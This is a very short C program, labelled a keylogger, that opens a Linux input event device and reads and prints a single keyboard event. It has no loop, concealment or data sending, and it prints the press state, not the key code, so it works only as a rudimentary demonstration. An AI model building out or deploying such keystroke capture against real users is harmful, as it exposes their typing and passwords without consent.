#include<stdio.h>
#include<fcntl.h>
#include<stdlib.h>
#include<linux/input.h>
#include<unistd.h>
int main(int argc, char *argv[])
{

if(argc != 2)

{
printf("Usage: %s <event-file-path>\n", argv[0]);
exit(-1);

}
printf("Keylogger active...\n");
int fd = open(argv[1], O_RDONLY, 0);
printf("Opened file descriptor: %d\n", fd);


struct input_event my_input_event;
read(fd, &my_input_event, sizeof(my_input_event));
printf("Key pressed: %d\n", my_input_event.value);
}
